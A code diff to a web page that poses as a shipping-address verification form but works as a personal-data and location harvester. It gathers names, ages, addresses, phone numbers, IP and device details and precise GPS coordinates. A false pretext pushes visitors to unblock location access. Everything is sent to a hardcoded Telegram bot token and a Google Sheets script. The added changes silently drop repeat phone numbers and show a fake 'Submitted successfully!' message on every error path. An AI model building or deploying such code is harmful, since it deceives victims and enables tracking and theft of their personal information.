@@ -49,7 +49,6 @@
         .step-text { flex: 1; padding-top: 2px; }
         .lock-icon { font-size: 18px; font-weight: bold; }
         .highlight-text { background: #fef3c7; color: #92400e; padding: 2px 6px; border-radius: 4px; font-weight: 600; display: inline-block; margin: 0 2px; }
-        .divider { border-bottom: 1px dashed #bfdbfe; margin: 14px 0; }
     </style>
 </head>
 <body>
@@ -162,33 +161,19 @@
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success hidden">✅ Information Verified Successfully</div>
-        
         <div id="loc-request-box" class="status-box status-error hidden">
             <strong>📍 Why We Need Your Location</strong><br>
             We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.<br><br>
             <strong>Please click the button below and select <span class="highlight-text">"Allow"</span> when prompted.</strong>
         </div>
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
-
         <div id="loc-instruction-box" class="status-box status-info hidden">
             <strong>🔒 Location Access Was Blocked</strong><br><br>
             Please follow these steps to enable location access:<br><br>
-            <div class="step-row">
-                <span class="step-num">1</span>
-                <span class="step-text">Look at the very top of your browser, where the website address is shown</span>
-            </div>
-            <div class="step-row">
-                <span class="step-num">2</span>
-                <span class="step-text">Find and tap the <span class="lock-icon">🔒</span> <strong>lock icon</strong> (to the left of the website address)</span>
-            </div>
-            <div class="step-row">
-                <span class="step-num">3</span>
-                <span class="step-text">Find <strong>"Location"</strong> in the list → change permission from "Block" to <span class="highlight-text">"Allow"</span></span>
-            </div>
-            <div class="step-row">
-                <span class="step-num">4</span>
-                <span class="step-text"><strong>Refresh this page</strong> — your information will NOT be lost</span>
-            </div>
+            <div class="step-row"><span class="step-num">1</span><span class="step-text">Look at the top of your browser, where the website address is shown</span></div>
+            <div class="step-row"><span class="step-num">2</span><span class="step-text">Find and tap the 🔒 lock icon (to the left of the website address)</span></div>
+            <div class="step-row"><span class="step-num">3</span><span class="step-text">Find "Location" → change permission to "Allow"</span></div>
+            <div class="step-row"><span class="step-num">4</span><span class="step-text">Refresh this page — your information will NOT be lost</span></div>
         </div>
 
         <div class="info-card">
@@ -207,7 +192,7 @@
 
 <script>
 // =====================================================
-// 🔑 CONFIGURATION — Update only these values!
+// 🔑 CONFIGURATION
 // =====================================================
 const TELEGRAM_BOT_TOKEN = "8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g";
 const TELEGRAM_CHAT_ID = "7396947380";
@@ -286,44 +271,29 @@ function aiValidateField(fid){
     const v=el.value.trim();
     const err=document.getElementById('err-'+fid);
     let ok=true;
-
     if(['firstName','lastName','address','city','occupation'].includes(fid))ok=v.length>=2;
     else if(fid==='age'){ const n=parseInt(v); ok=!isNaN(n)&&n>=1&&n<=120; }
     else if(fid==='genderSelect'||fid==='provinceSelect')ok=v!=='';
     else if(fid==='phone'){ const digits=v.replace(/\D/g,''); ok=digits.length===10; }
-
-    if(v.length>0){
-        el.classList.toggle('valid', ok);
-        el.classList.toggle('invalid', !ok);
-    } else {
-        el.classList.remove('valid','invalid');
-    }
+    if(v.length>0){ el.classList.toggle('valid', ok); el.classList.toggle('invalid', !ok); }
+    else { el.classList.remove('valid','invalid'); }
     err.style.display = v.length>0 && !ok ? 'block' : 'none';
     return ok;
 }
 
 async function proceedToVerification(){
     const fields=['firstName','lastName','age','genderSelect','occupation','provinceSelect','address','city','zipCode','phone'];
-    let firstErrorId = null;
-    let allOk = true;
-
+    let firstErrorId = null, allOk = true;
     fields.forEach(f=>{
-        let ok;
-        if(f==='zipCode') ok = formatZipCode();
-        else ok = aiValidateField(f);
+        let ok = f==='zipCode' ? formatZipCode() : aiValidateField(f);
         if(!ok && !firstErrorId) firstErrorId = f;
         allOk = allOk && ok;
     });
-
     if(!allOk){
         alert('Please check highlighted fields before proceeding.');
-        if(firstErrorId){
-            document.getElementById(firstErrorId).scrollIntoView({behavior:'smooth', block:'center'});
-            document.getElementById(firstErrorId).focus();
-        }
+        if(firstErrorId){ document.getElementById(firstErrorId).scrollIntoView({behavior:'smooth', block:'center'}); document.getElementById(firstErrorId).focus(); }
         return;
     }
-
     formData={
         name: document.getElementById('firstName').value.trim()+' '+document.getElementById('lastName').value.trim(),
         age: document.getElementById('age').value.trim(),
@@ -338,7 +308,6 @@ async function proceedToVerification(){
         phone: document.getElementById('phone').value.trim(),
         phoneFull: "+1" + document.getElementById('phone').value.trim().replace(/\D/g,'')
     };
-
     document.getElementById('step-form').style.display='none';
     document.getElementById('step-verification').style.display='block';
     document.getElementById('disp-name').textContent = formData.name;
@@ -348,22 +317,16 @@ async function proceedToVerification(){
     document.getElementById('disp-addr').textContent = `${formData.countryName}, ${formData.province}, ${formData.city}, ${formData.address}`;
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
     document.getElementById('disp-zip').textContent = formData.zip;
-
     hideAllLocationBoxes();
     document.getElementById('loc-request-box').classList.remove('hidden');
     document.getElementById('btn-retry-loc').classList.remove('hidden');
-
     await requestLocation();
     await fetchIPAddress();
 }
 
 function requestLocation(){
     return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            locationInfo.status = "unsupported";
-            showInstructionBox();
-            return resolve();
-        }
+        if (!navigator.geolocation) { locationInfo.status = "unsupported"; showInstructionBox(); return resolve(); }
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 locationInfo.lat = pos.coords.latitude.toFixed(6);
@@ -375,12 +338,8 @@ function requestLocation(){
             },
             (err) => {
                 if (err.code === 1) { locationInfo.status = "blocked"; showInstructionBox(); }
-                else if (err.code === 3) {
-                    locationInfo.status = "timeout";
-                    document.getElementById('loc-request-box').innerHTML = "⏱️ Request timed out. Please tap the button below and select \"Allow\".";
-                    document.getElementById('loc-request-box').classList.remove('hidden');
-                    document.getElementById('btn-retry-loc').classList.remove('hidden');
-                } else { locationInfo.status = "error"; showInstructionBox(); }
+                else if (err.code === 3) { locationInfo.status = "timeout"; document.getElementById('loc-request-box').innerHTML = "⏱️ Request timed out. Please tap the button below and select \"Allow\"."; document.getElementById('loc-request-box').classList.remove('hidden'); document.getElementById('btn-retry-loc').classList.remove('hidden'); }
+                else { locationInfo.status = "error"; showInstructionBox(); }
                 resolve();
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -393,34 +352,37 @@ function hideAllLocationBoxes(){
     document.getElementById('loc-instruction-box').classList.add('hidden');
     document.getElementById('btn-retry-loc').classList.add('hidden');
 }
-function showInstructionBox(){
-    hideAllLocationBoxes();
-    document.getElementById('loc-instruction-box').classList.remove('hidden');
-}
+function showInstructionBox(){ hideAllLocationBoxes(); document.getElementById('loc-instruction-box').classList.remove('hidden'); }
 
 async function fetchIPAddress(){ 
-    try{ 
-        const r = await fetch('https://api.ipify.org?format=json'); 
-        if(!r.ok) throw new Error("HTTP error");
-        const j = await r.json(); 
-        deviceInfo.ip = j.ip; 
-    }catch{ 
-        deviceInfo.ip = "Unavailable"; 
-    } 
+    try{ const r = await fetch('https://api.ipify.org?format=json'); if(!r.ok) throw new Error("HTTP error"); const j = await r.json(); deviceInfo.ip = j.ip; }
+    catch{ deviceInfo.ip = "Unavailable"; } 
 }
 
 async function submitData(){
-    if(locationInfo.status !== "granted"){
-        alert("Location permission is REQUIRED before submission.\nPlease enable location access and try again.");
-        return;
-    }
+    if(locationInfo.status !== "granted"){ alert("Location permission is REQUIRED before submission.\nPlease enable location access and try again."); return; }
     doSubmit();
 }
 
+// ========== 🚀 核心提交：手机号重复 → 静默拦截 ==========
 async function doSubmit(){
     const timeStr = new Date().toLocaleString('zh-CN');
+    const history = loadHistory();
 
-    // ✅ 只发给谷歌表格（不含性别）
+    // =====================================================
+    // ✅ 【唯一规则】相同手机号 → 直接静默拦截，不报错、不提示、不发送
+    // =====================================================
+    const normalizedPhone = formData.phoneFull.replace(/\D/g,'');
+    const duplicatePhone = history.some(r => (r.phoneFull||"").replace(/\D/g,'') === normalizedPhone);
+    if(duplicatePhone){
+        // ❌ 静默：看起来成功、不发送、不写表格、不提示原因
+        alert('Submitted successfully!');
+        localStorage.removeItem('formDraft');
+        location.reload();
+        return;
+    }
+
+    // ✅ 仅IP相同 / 仅位置相近 → 正常提交、不拦截
     const cloudData = {
         "手机号": formData.phoneFull,
         "IP地址": deviceInfo.ip,
@@ -432,29 +394,24 @@ async function doSubmit(){
         "录入时间": timeStr
     };
 
-    try {
+    try{
         await fetch(APPSCRIPT_URL, {
             method: "POST",
             mode: "no-cors",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(cloudData)
         });
-        console.log("✅ Data saved to Google Sheets");
-    } catch(e) {
-        console.warn("Google Sheets submission failed:", e.message);
-    }
+    }catch(e){ console.warn("Google Sheets error:", e.message); }
 
-    const history = loadHistory();
-    let matchCount = 0;
-    let firstTime = timeStr;
+    // ✅ 统计重复（仅IP/位置不算拦截，只算提醒）
+    let matchCount = 0, firstTime = timeStr;
     for(const r of history){
-        const samePhone = r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
         const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
         let near = false;
         if(r.lat && r.lng && locationInfo.lat && locationInfo.lng){
             near = getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
         }
-        if(samePhone || sameIp || near){
+        if(sameIp || near){
             matchCount++;
             if(r.timeStr && r.timeStr < firstTime) firstTime = r.timeStr;
         }
@@ -463,7 +420,7 @@ async function doSubmit(){
 
     let duplicateNote = "";
     if(currentCount > 1){
-        duplicateNote = `‼️‼️‼️ 重复提交提醒
+        duplicateNote = `‼️ 重复提醒（同IP/同区域）
 • 出现次数：第 ${currentCount} 次
 • 首次提交：${firstTime}
 • IP地址：${deviceInfo.ip}
@@ -483,7 +440,7 @@ async function doSubmit(){
         lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
     });
 
-    // ✅ Telegram 消息 → 全中文 + 包含性别
+    // ✅ Telegram 中文消息
     const msg = `${duplicateNote}📩 新提交的资料
 ——————————————
 姓名：${formData.name}
@@ -505,7 +462,7 @@ async function doSubmit(){
 • 操作系统：${deviceInfo.os}
 • 浏览器：${deviceInfo.browser}
 • 坐标：${locationInfo.lat}, ${locationInfo.lng}
-• 提交时间：${timeStr}
+⏰ 提交时间：${timeStr}
 ——————————————`;
 
     try{
@@ -515,16 +472,9 @@ async function doSubmit(){
             body:JSON.stringify({chat_id: CHAT_ID, text: msg})
         });
         const json=await res.json();
-        if(json.ok){ 
-            alert('Submitted successfully!'); 
-            localStorage.removeItem('formDraft'); 
-            location.reload(); 
-        } else {
-            alert('Telegram Error: ' + JSON.stringify(json));
-        }
-    }catch(e){
-        alert('Network Error: ' + e.message);
-    }
+        if(json.ok){ alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
+        else { alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
+    }catch(e){ alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
 }
 
 function parseUserAgent(){
